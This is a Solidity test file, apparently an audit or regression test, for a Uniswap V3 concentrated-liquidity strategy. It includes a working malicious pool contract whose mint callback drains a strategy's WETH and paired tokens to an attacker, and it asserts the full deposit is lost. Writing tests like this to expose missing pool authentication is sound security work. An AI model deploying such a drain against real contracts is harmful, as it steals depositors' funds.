// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {StrategyManager} from "contracts/StrategyManager.sol";
import {UniCLStrat} from "contracts/strategies/UniCLStrat.sol";
import {Auth} from "libraries/Auth.sol";
import {IUniCLStrat} from "interfaces/strategies/IUniCLStrat.sol";
import {IStrategyManager} from "interfaces/IStrategyManager.sol";
import {IUniswapV3Pool} from "interfaces/integrations/uniswap/IUniswapV3Pool.sol";
import {TickMath} from "libraries/integrations/uniswap/TickMath.sol";

import {UniCLStratTestBase} from "../../../helpers/UniCLStratTestBase.sol";
import {MockERC20} from "../../../mocks/MockERC20.sol";
import {MockController} from "../../../mocks/MockController.sol";
import {MockConverter} from "../../../mocks/MockConverter.sol";
import {MockConverterAdapter} from "../../../mocks/MockConverterAdapter.sol";
import {MockWETH} from "../../../mocks/UniCLStratMocks.sol";

interface IUniCLMintCallbackTarget {
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external;
}

/// @dev Interface-compatible pool that is deliberately not created or authenticated by a factory.
contract MaliciousConfiguredPool is IUniswapV3Pool {
    using SafeERC20 for IERC20Metadata;

    address public immutable override token0;
    address public immutable override token1;
    address public immutable attacker;
    int24 public immutable override tickSpacing;
    uint24 public constant override fee = 3000;

    constructor(address token0_, address token1_, int24 tickSpacing_, address attacker_) {
        token0 = token0_;
        token1 = token1_;
        tickSpacing = tickSpacing_;
        attacker = attacker_;
    }

    function slot0()
        external
        pure
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        )
    {
        return (TickMath.getSqrtRatioAtTick(0), 0, 0, 2, 2, 0, true);
    }

    function observe(uint32[] calldata secondsAgos)
        external
        pure
        returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s)
    {
        tickCumulatives = new int56[](secondsAgos.length);
        secondsPerLiquidityCumulativeX128s = new uint160[](secondsAgos.length);
    }

    function positions(bytes32)
        external
        pure
        returns (uint128 liquidity, uint256 feeGrowth0, uint256 feeGrowth1, uint128 owed0, uint128 owed1)
    {}

    function mint(address, int24, int24, uint128, bytes calldata data)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        amount0 = IERC20Metadata(token0).balanceOf(msg.sender);
        amount1 = IERC20Metadata(token1).balanceOf(msg.sender);

        // UniCLStrat accepts any amounts supplied by its configured pool while `_minting` is true.
        IUniCLMintCallbackTarget(msg.sender).uniswapV3MintCallback(amount0, amount1, data);

        IERC20Metadata(token0).safeTransfer(attacker, IERC20Metadata(token0).balanceOf(address(this)));
        IERC20Metadata(token1).safeTransfer(attacker, IERC20Metadata(token1).balanceOf(address(this)));
    }

    function burn(int24, int24, uint128) external pure returns (uint256 amount0, uint256 amount1) {}

    function collect(address, int24, int24, uint128, uint128)
        external
        pure
        returns (uint128 amount0, uint128 amount1)
    {}
}

contract PoolAuthenticationTest is UniCLStratTestBase {
    address internal controller;
    address internal poolAttacker = makeAddr("poolAttacker");

    StrategyManager internal realStrategyManager;
    MaliciousConfiguredPool internal maliciousPool;

    function setUp() public override {
        vm.warp(INITIAL_TIMESTAMP);
        registry = _deployRegistry(admin);
        controller = address(new MockController());

        StrategyManager implementation = new StrategyManager();
        IStrategyManager.FeeConfig memory feeConfig =
            IStrategyManager.FeeConfig({daoTreasury: daoTreasury, performanceFeeBps: 0});
        realStrategyManager = StrategyManager(
            payable(
                address(
                    new ERC1967Proxy(
                        address(implementation),
                        abi.encodeWithSelector(StrategyManager.initialize.selector, address(registry), feeConfig)
                    )
                )
            )
        );
        strategyManager = address(realStrategyManager);

        weth = new MockWETH();
        pairedToken = new MockERC20("Paired Token", "PAIR", PAIRED_TOKEN_DECIMALS);
        maliciousPool = new MaliciousConfiguredPool(address(weth), address(pairedToken), TICK_SPACING, poolAttacker);
        converter = new MockConverter(weth, pairedToken, strategyManager);
        swapAdapter = new MockConverterAdapter(weth, pairedToken);
        oracle = _deployOracle();

        vm.startPrank(admin);
        registry.registerContract(Auth.CONTROLLER, controller);
        registry.registerContract(Auth.ORACLE, address(oracle));
        registry.registerContract(Auth.CONVERTER, address(converter));
        registry.registerContract(Auth.STRATEGY_MANAGER, strategyManager);
        vm.stopPrank();

        strategy = new UniCLStrat(_maliciousPoolConfig());

        vm.prank(admin);
        realStrategyManager.addStrategy(address(strategy), 100, 100);
    }

    function test_ConfiguredNonFactoryPoolDrainsDepositDuringMintCallback() public {
        vm.deal(strategyManager, DEPOSIT_AMOUNT);

        vm.prank(controller);
        uint256 deposited = realStrategyManager.depositToStrategy(address(strategy), DEPOSIT_AMOUNT);

        assertEq(deposited, DEPOSIT_AMOUNT, "authorized strategy deposit completes");
        assertEq(strategy.totalDeposited(), DEPOSIT_AMOUNT, "strategy accounts for the deposit");
        assertEq(weth.balanceOf(address(strategy)), 0, "callback drains strategy WETH");
        assertEq(pairedToken.balanceOf(address(strategy)), 0, "callback drains paired inventory");
        assertEq(
            weth.balanceOf(poolAttacker) + pairedToken.balanceOf(poolAttacker),
            DEPOSIT_AMOUNT,
            "malicious configured pool forwards all inventory to attacker"
        );
        assertEq(strategy.navInETH(), 0, "strategy has no recoverable value after successful deposit");
    }

    function _maliciousPoolConfig() internal view returns (IUniCLStrat.DeploymentConfig memory) {
        return IUniCLStrat.DeploymentConfig({
            addresses: IUniCLStrat.AddressConfig({
                registry: address(registry),
                weth: address(weth),
                pool: address(maliciousPool)
            }),
            routes: IUniCLStrat.RouteConfig({
                swapAdapter: address(swapAdapter),
                wethToPairedTokenPath: abi.encodePacked(address(weth), uint24(3000), address(pairedToken)),
                pairedTokenToWethPath: abi.encodePacked(address(pairedToken), uint24(3000), address(weth))
            }),
            strategy: IUniCLStrat.StrategyConfig({
                positionWidth: POSITION_WIDTH,
                rebalanceTickThreshold: REBALANCE_TICK_THRESHOLD,
                maxTickDeviation: MAX_TICK_DEVIATION,
                twapInterval: TWAP_INTERVAL,
                shortTwapInterval: SHORT_TWAP_INTERVAL,
                maxTotalNAV: MAX_TOTAL_NAV
            })
        });
    }
}
